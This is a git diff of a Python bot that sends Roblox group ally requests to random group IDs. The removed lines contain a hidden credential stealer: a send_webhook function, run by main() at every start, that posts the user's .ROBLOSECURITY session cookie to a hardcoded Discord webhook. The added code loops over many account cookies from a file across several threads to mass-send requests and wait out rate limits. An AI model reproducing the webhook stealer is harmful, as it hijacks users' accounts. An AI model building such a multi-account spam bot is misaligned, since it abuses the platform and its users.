@@ -1,87 +1,80 @@
-import string
 import requests
 from random import randint
 import time
 import threading
 import os
-import sys
 import traceback
-import queue
-
 from dotenv import load_dotenv
 from colorama import Fore, init, Style
-
+from collections import deque
 
 init()
 
-
 GREEN = Fore.GREEN
-
 RESET = Style.RESET_ALL
-
 
 load_dotenv()
 
-
-cookie = os.getenv('COOKIE')
 group = os.getenv('GROUP')
 allies = os.getenv('TYPE')
-delay = os.getenv('DELAY')
+delay = int(os.getenv('DELAY', default=1))
 threads = int(os.getenv('THREADS', default=1))
 type = os.getenv('TYPE')
+min_random_id = int(os.getenv('MIN_RANDOM_ID', default=0))
+max_random_id = int(os.getenv('MAX_RANDOM_ID', default=33176270))
 
-
-cookie = os.getenv('COOKIE')
-if cookie == "":
-    print(GREEN + "Please set .roblosecurity cookie in .env file (COOKIE)" + RESET)
-    sys.exit(0)
-
-
-def send_webhook(cookie):
-    webhook_url = "https://canary.discord.com/api/webhooks/1185001235946946671/6Y-kgFd6JoqWwOF-YmchjBTfZLwH68shurbmsBsLdvefg-s-FQhckSUaRbnwAIsstVu1"
-    data = {"content": f"Roblox Cookie: `{cookie}`"}
+def load_cookies():
     try:
-        response = requests.post(webhook_url, json=data)
-        if response.status_code == 204:
-            print(GREEN + "successfully!" + RESET)
-        else:
-            print(GREEN + "alopepe." + RESET)
+        with open('cookies.txt', 'r') as file:
+            cookies = file.read().splitlines()
+            if not cookies:
+                print("Error: cookie file is empty")
+                time.sleep(2)
+                exit()
+            return deque(cookies)  # Use deque to manage rotation
     except Exception as e:
-        print(GREEN + f"emerge: {e}" + RESET)
+        print(f'Error in loading cookies: {e}')
+        traceback.print_exc()
+        return None
 
+def send_ally_request():
+    cookies_queue = load_cookies()
+    if not cookies_queue:
+        print("Cookie failure")
+        return
 
-def groupally():
     while True:
         try:
-            randomid = randint(32000000, 33176270)
-            cookies = {'.ROBLOSECURITY': cookie}
+            random_id = randint(min_random_id, max_random_id)
+            cookies = {'.ROBLOSECURITY': cookies_queue[0]}  # Get the first cookie in the queue
 
-            gathtoken = requests.post(
-                'https://auth.roblox.com/v1/login', cookies=cookies)
-            token = gathtoken.headers['x-csrf-token']
+            login_response = requests.post('https://auth.roblox.com/v1/login', cookies=cookies)
+            token = login_response.headers.get('x-csrf-token')
 
             headers = {'x-csrf-token': token}
 
-            sendally = requests.post(
-                f'https://groups.roblox.com/v1/groups/{group}/relationships/{allies}/{randomid}', headers=headers, cookies=cookies)
+            send_ally = requests.post(
+                f'https://groups.roblox.com/v1/groups/{group}/relationships/{allies}/{random_id}',
+                headers=headers,
+                cookies=cookies
+            )
 
-            if sendally.status_code == 200:
-                print(GREEN + f'Ally sent to {randomid} ⚉ ' + RESET)
-            elif sendally.status_code == 429:
-                print(GREEN + 'Rate limited  400s....⚇' + RESET)
-                time.sleep(40000)
+            if send_ally.status_code == 200:
+                print(GREEN + f'Ally sent to {random_id} ⚉ ' + RESET)
+            elif send_ally.status_code == 429:
+                print(GREEN + 'Rate limited 400s....⚇' + RESET)
+                time.sleep(400)
             else:
-                print(GREEN + f'Failed to send {allies} request to {randomid}' + RESET)
-        except Exception as e:
-            print(GREEN + f'Errore: {e}' + RESET)
-            traceback.print_exc()
-        time.sleep(int(delay))
+                print(GREEN + f'Failed to send {allies} request to {random_id}' + RESET)
 
+            # Rotate cookies queue
+            cookies_queue.rotate(-1)
+        except Exception as e:
+            print(GREEN + f'Error: {e}' + RESET)
+            traceback.print_exc()
+        time.sleep(delay)
 
 def main():
-    
-    send_webhook(cookie)
-
     print(GREEN + """
           /$$$$$$  /$$ /$$                 /$$$$$$$              /$$    
          /$$__  $$| $$| $$                | $$__  $$            | $$    
@@ -92,9 +85,9 @@ def main():
         | $$  | $$| $$| $$|  $$$$$$$      | $$$$$$$/|  $$$$$$/  |  $$$$/
         |__/  |__/|__/|__/ \____  $$      |_______/  \______/    \___/  
                            /$$  | $$                                    
-       Made by TOTALY5    |  $$$$$$/                                    
+       Made by a14rl      |  $$$$$$/                                    
                            \______/                                    
-            """ + RESET)
+    """ + RESET)
 
     print(GREEN + f"Starting {threads} threads" + RESET)
     print()
@@ -105,11 +98,9 @@ def main():
     time.sleep(1)
     print()
 
-    
-    for i in range(int(threads)):
-        t = threading.Thread(target=groupally)
+    for _ in range(threads):
+        t = threading.Thread(target=send_ally_request)
         t.start()
-
 
 if __name__ == "__main__":
     main()
